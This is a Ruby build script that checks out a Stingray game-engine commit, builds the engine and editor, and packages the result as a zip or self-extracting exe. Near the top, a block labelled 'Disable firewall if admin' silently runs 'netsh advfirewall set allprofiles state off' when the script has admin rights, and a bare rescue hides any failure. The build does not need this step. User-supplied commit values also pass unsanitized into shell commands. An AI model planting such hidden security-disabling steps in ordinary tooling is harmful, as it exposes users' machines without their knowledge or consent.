#!/usr/bin/env ruby
# Generate a Stingray build for a specific commit
# ./make.rb --distrib --no-internal --no-exporters --engine --editor

require 'find'
require 'fileutils'
require 'date'
require 'open3'

begin
	gem 'rubyzip'
	require 'slop'
	require 'sys/filesystem'
	require 'zip/zip'
	require 'zip/zipfilesystem'
rescue LoadError => e
	puts e
	print "Error loading gems, installing them..."
	sys = lambda do |s|
		puts(s)
		res = system(s)
		raise "execution error" unless res
	end
	sys.call("gem install slop --conservative")
	sys.call("gem install sys-filesystem --conservative")
	sys.call("gem install rubyzip --conservative")
	Gem.clear_paths
	retry
end

# Disable firewall if admin
require 'win32/registry'
is_admin = false
begin
	Win32::Registry::HKEY_USERS.open('S-1-5-19') {|reg| }
	is_admin = true
	if is_admin
		run_process(1, "netsh", "advfirewall", "set", "allprofiles", "state", "off")
	end
rescue
end

opts = Slop.parse suppress_errors: true do |o|
	o.banner = <<eos
usage: generate-build.rb [OPTIONS...] [BUILD OPTIONS]

Used to generate custom builds for the Stingray Build Generator.

eos
	o.bool '-h', '--help', 'Print help and exit'
	o.string '--name', 'Build name'
	o.string '-r', '--repo', 'Repo in which to start build'
	o.string '-b', '--commit', 'Which commit to build'
	o.string '-o', '--output', 'Output directory where to store the build'
	o.bool '-z', '--zip', 'Zip all the builds'
	o.bool '-v', '--verbose', 'Verbose output'
end

if opts.help?
	puts opts
	exit
end

def git_list(arg)
	return `#{arg}`.lines.collect {|s| s.strip}
end

def run(cmd, verbose: false, capture: true)
    if verbose && !capture
        status = system(cmd)
        return "", status
    elsif verbose && capture
        s = ""
        exit_status = nil
        Open3.popen3(cmd) do |ins, outs, err, wait_thr|
            while line = outs.gets
                puts line
                s << line
            end
            exit_status = wait_thr.value
        end
        return s.strip, exit_status
    else
        s,status = Open3.capture2e(cmd)
        return s.strip, status.exitstatus
    end
end

def compress(path, dest)
	path.sub!(%r[/$],'')
	archive = File.join(dest,File.basename(path))+'.zip'
	FileUtils.rm archive, :force=>true

	Zip::ZipFile.open(archive, 'w') do |zipfile|
		Dir["#{path}/**/**"].reject{|f|f==archive}.each do |file|
			zipfile.add(file.sub(path+'/',''),file)
		end
	end
end

if opts[:repo] == nil
	raise ("Invalid repo path options")
end

# Parse options
$script_dir = File.expand_path(File.dirname(__FILE__))
commit = opts[:commit]

repo_directory = File.expand_path (opts[:repo])
raise ("Repo dir doesn't exists") unless File.directory?(repo_directory)
puts "Repo directory: #{repo_directory}"

output_directory = File.expand_path (opts[:output] || "builds")
raise ("Output directory does not exist") unless File.directory?(output_directory)
stat = Sys::Filesystem.stat(output_directory)
gb_available = stat.block_size * stat.blocks_free / 1024 / 1024 / 1024
puts "Output directory: #{output_directory} (~#{gb_available} GB)"

search_pattern = opts[:search] || "Merge pull"

# Create output directory
FileUtils.mkdir_p(output_directory) unless File.directory?(output_directory)

repo_lib_directory = File.join(output_directory, ".libs")
FileUtils.mkdir_p(repo_lib_directory) unless File.directory?(repo_lib_directory)
puts "Lib dir: #{repo_lib_directory}"

stat = Sys::Filesystem.stat(output_directory)
gb_available = stat.block_size * stat.blocks_free / 1024 / 1024 / 1024
raise ("Low disk space!") if gb_available < 10

# Start build
start_time = Time.now

# Max 155 characters per quote.
# ===================================================================== LONGEST QUOTE =====================================================================
quotes = [
"It's not that I'm so smart, it's just that I stay with problems longer.",
"Ignorance is the curse of God; knowledge is the wing wherewith we fly to heaven.",
"Software built on pride and love of subject is superior to software built for profit.",
"If developers' pains are Java and .NET, the antidote is dynamic languages and frameworks.",
"Software is like sex: it's better when it's free.",
"The ultimate search engine would basically understand everything in the world, and it would always give you the right thing.",
"Mathematics is the queen of the sciences and number theory is the queen of mathematics.",
"Computer science is no more about computers than astronomy is about telescopes.",
"They don't make bugs like Bunny anymore.",
"Don't worry if it doesn't work right. If everything did, you'd be out of a job.",
"It is not enough for code to work.",
"This software rocks!",
"If you aren't happy with this world, change it.",
"This software will stop in 3 minutes...",
"Premature optimization is the root of all evil.",
"Low-level programming is good for the programmer's soul.",
"It's nice to have a game that sells a million copies.",
"It's time to kick ass and chew bubble gum, and I'm all outta gum!",
"When something is important enough, you do it even if the odds are not in your favor.",
"Great companies are built on great products.",
"I think it matters whether someone has a good heart.",
"You found a bug? Look right... Look left... If no one else saw it happens, proceed! -- A lazy QA",
"Nine people can't make a baby in a month.",
"There are only two kinds of languages: the ones people complain about and the ones nobody uses",
"The answer to life the universe and everything equals 101010"
]

Dir.chdir(repo_directory) do

	# Check if no local changes
	system( "git diff --quiet --exit-code" ) or raise("You have unstaged files at #{repo_directory}, quitting...")
	system( "git ls-files --other --exclude-standard | sed q1" ) or raise("You have untracked files #{repo_directory}, quitting...")

	if !commit
		commit = `git rev-parse --short HEAD`.strip
	end

	ENV['SR_LIB_DIR'] = repo_lib_directory
	ENV['SR_PRODUCT_VERSION_LABEL'] = quotes.sample

	# Fetch depo
	puts "Fetching #{commit}..."
	o, status = run("git fetch --all", verbose: opts[:verbose], capture: true)
	if status != 0
		STDERR.puts " Failed, can't fetch repo."
		exit 1
	end

	# Checkout revision
	o, status = run("git reset --hard #{commit}", verbose: opts[:verbose], capture: true)
	if status != 0
		STDERR.puts " Failed, can't checkout revision."
		exit 1
	end

	# Create build folder
	commit_date_short = `git show -s --format=%ad --date=short #{commit}`.strip
	commit_date_long = Date.parse(`git show -s --format=%ad #{commit}`.strip)
	folder_id = "#{commit}_#{commit_date_short}"
	ENV['SR_PRODUCT_BUILD_TIMESTAMP'] = commit_date_long.to_s

	if opts[:name] == nil
		opts[:name] = "stingray_#{commit}_#{commit_date_short}"
	end

	# Set build output directory
	build_output_dir = File.join(output_directory, ".building", folder_id)
	FileUtils.rm_rf(build_output_dir) if File.directory?(build_output_dir)
	FileUtils.mkdir_p(build_output_dir)
	ENV['SR_BIN_DIR'] = build_output_dir

	# Write signature file
	make_cmd = "ruby make.rb --verbose --distrib --no-internal --no-exporters --no-use-editor-templates"
	make_cmd += " --no-remote-cache --engine --editor --output \"#{build_output_dir}\" #{opts.arguments.join(' ')}"

	puts "Running #{make_cmd}"
	File.open(File.join(build_output_dir, "BUILD_INFO.TXT"), 'w') { |file| file.write(make_cmd + "\r\n" + `git show #{commit}`) }

	# Build content
	build_log, status = run(make_cmd, verbose: opts[:verbose])
	if status != 0

		# Try to clean build directory and retry
		if File.directory?(File.join(repo_directory, 'build'))
			FileUtils.rm_rf(File.join(repo_directory, 'build'))
		end

		build_log, status = run(make_cmd, verbose: opts[:verbose])
		if status != 0
			File.open(File.join(output_directory, "BUILD_FAILED_#{commit}.TXT"), 'w') { |file| file.write(make_cmd + "\r\n" + build_log) }
			STDERR.puts build_log
			FileUtils.rm_rf(build_output_dir)
			exit 1
		end
	end

	# Delete settings folder
	FileUtils.rm_rf(File.join(build_output_dir, "settings"))

	# Move folder to final depot when ready to be used.
	if opts.zip?
		print " Zipping..."

		zip_config = File.read(File.join($script_dir, 'stingray_achieve.conf'))
		new_zip_config = zip_config.gsub(/Title=UPDATE_ME/, "Title=Autodesk Stingray - #{opts[:name].gsub('stingray_', '')}")
		#new_zip_config = new_zip_config.gsub(/Setup=UPDATE_ME/, "Setup=#{opts[:name]}\\editor\\stingray_editor.exe")
		new_zip_config = new_zip_config.gsub(/Setup=UPDATE_ME/, "Setup=%SystemRoot%\\explorer.exe /select,\"#{opts[:name]}\\editor\\stingray_editor.exe\"")

		# To write changes to the file, use:
		zip_archieve_conf_filepath = File.join(build_output_dir, "stingray_achieve.conf")
		File.open(zip_archieve_conf_filepath, "w") {|file| file.puts new_zip_config }

		exe_output_path = (output_directory + "\\#{opts[:name]}" + ".exe").gsub('/', '\\')
		zip_cmd = "\"C:\\Program Files\\WinRAR\\WinRar.exe\" a " +
			"-ap\"#{opts[:name]}\" -r -o+ -sfx -m5 -mt3 -ep1 " +
			"-iicon\"#{File.join($script_dir, 'stingray_icon.ico').gsub('/', '\\')}\" " +
			"-iimg\"#{File.join($script_dir, 'stingray_logo.bmp').gsub('/', '\\')}\" " +
			"-x*.pdb -x*.map " +
			"-z\"#{zip_archieve_conf_filepath.gsub('/', '\\')}\" " +
			"-- \"#{exe_output_path}\" \"#{build_output_dir.gsub('/', '\\')}\\*.*\""
		#puts zip_cmd
		system(zip_cmd)
		# compress build_output_dir, output_directory
		FileUtils.rm_rf(build_output_dir)
	else
		final_build_dir = File.join(output_directory, folder_id)
		if File.directory?(final_build_dir)
			FileUtils.rm_rf(final_build_dir)
		end
		FileUtils.mv build_output_dir, final_build_dir
	end
end

puts " Done. (%.1f seconds.)" % (Time.now - start_time)
